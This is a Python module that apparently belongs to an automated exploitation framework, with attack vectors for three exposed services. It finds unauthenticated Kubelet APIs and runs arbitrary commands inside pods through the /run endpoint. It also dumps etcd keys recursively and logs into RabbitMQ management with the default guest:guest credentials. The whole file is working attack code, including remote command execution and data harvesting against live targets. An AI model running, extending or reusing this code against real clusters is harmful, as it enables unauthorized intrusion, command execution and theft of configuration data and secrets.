"""Kubelet-unauth, etcd, RabbitMQ-Default."""
from __future__ import annotations
import json
import re

from .exploit import RunResult


def _s():
    import requests, urllib3
    urllib3.disable_warnings()
    s = requests.Session(); s.verify = False
    return s


class KubeChannel:
    def __init__(self, base, ns, pod, cont):
        self.base, self.ns, self.pod, self.cont = base, ns, pod, cont

    def run(self, target, cmd, timeout=None, audit=None):
        try:
            r = _s().post(f"{self.base}/run/{self.ns}/{self.pod}/{self.cont}",
                          params={"cmd": cmd}, timeout=timeout or 25)
            out = r.text
        except Exception as e:
            if audit:
                audit.write("vector", "rce_fail", getattr(target, "url", str(target)),
                            vector="kubelet", cmd=cmd, error=type(e).__name__)
            return RunResult(False, "", type(e).__name__, 3)
        if audit:
            audit.write("vector", "rce_ok", getattr(target, "url", str(target)),
                        vector="kubelet", cmd=cmd, head=out[:200])
        return RunResult(True, out)

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}", audit=audit).stdout


def kube_detect(t) -> bool:
    if t.port not in (10250, 10255):
        return False
    try:
        r = _s().get(t.url + "/pods", timeout=8)
        return r.status_code == 200 and '"items"' in r.text
    except Exception:
        return False


def kube_open(t, audit):
    try:
        r = _s().get(t.url + "/pods", timeout=10)
        items = r.json().get("items", [])
        for it in items:
            md = it.get("metadata", {})
            spec = it.get("spec", {})
            conts = spec.get("containers", [])
            if md.get("namespace") and md.get("name") and conts:
                ch = KubeChannel(t.url, md["namespace"], md["name"], conts[0]["name"])
                if ch.proof(t.url, "KBOK"):
                    audit.write("vector", "opened", t.url, vector="kubelet")
                    return ch
    except Exception:
        return None
    return None


def etcd_detect(t) -> bool:
    if t.port != 2379:
        return False
    try:
        r = _s().get(t.url + "/version", timeout=7)
        return r.status_code == 200 and "etcdserver" in r.text
    except Exception:
        return False


def etcd_harvest(t, audit):
    try:
        r = _s().get(t.url + "/v2/keys/?recursive=true", timeout=10)
        if r.status_code == 200 and '"node"' in r.text:
            keys = re.findall(r'"key":"([^"]{1,80})"', r.text)[:12]
            audit.write("harvest", "etcd-keys", t.url, keys=", ".join(keys)[:300])
    except Exception:
        pass
    return None


def rabbit_detect(t) -> bool:
    if t.port != 15672:
        return False
    try:
        r = _s().get(t.url + "/api/overview", auth=("guest", "guest"), timeout=8)
        return r.status_code == 200 and "rabbitmq_version" in r.text
    except Exception:
        return False


def rabbit_harvest(t, audit):
    try:
        j = _s().get(t.url + "/api/overview", auth=("guest", "guest"), timeout=8).json()
        audit.write("harvest", "rabbitmq-admin", t.url,
                    creds="guest:guest", version=j.get("rabbitmq_version", ""))
    except Exception:
        pass
    return None
